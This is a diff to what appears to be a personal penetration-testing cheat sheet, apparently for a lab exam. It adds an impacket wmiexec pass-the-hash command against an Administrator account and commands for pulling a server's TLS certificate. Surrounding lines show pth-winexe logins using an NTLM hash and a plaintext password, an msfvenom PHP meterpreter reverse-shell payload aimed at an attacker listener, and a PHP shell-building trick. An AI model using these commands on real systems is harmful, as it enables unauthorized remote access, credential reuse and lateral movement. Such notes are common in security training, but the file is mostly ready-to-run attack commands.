@@ -469,6 +469,12 @@ pth-winexe -U kevin%aad3b435b51404eeaad3b435b51404ee:3164f206290117d74e9fa582139
 pth-winexe -U kevin%f8uHwN88Sx //10.11.1.230 cmd
 
 ###################################
+####  wmiexec.py             ######
+###################################
+python /usr/share/doc/python-impacket/examples/wmiexec.py -hashes :cb5141dcdaa451b097asdfadsfds Administrator@1.2.1.2
+
+
+###################################
 ####   POWERSHELL           #######
 ###################################
 powershell $PSVersionTable.PSVersion
@@ -536,6 +542,13 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.0.131 LPORT=443 EXITFUNC=thr
 alias pbcopy='xclip -selection clipboard'
 alias pbpaste='xclip -selection clipboard -o'
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+##############################
+####### WEB CERT #############
+##############################
+openssl s_client -connect 10.11.90.128:8443 -showcerts </dev/null 2>/dev/null | openssl x509 -outform PEM > ../10.11.90.128/mycert.pem
+
+wget https:/server.edu:443/somepage --ca-certificate=mycertfile.pem
 
 
 ###################################
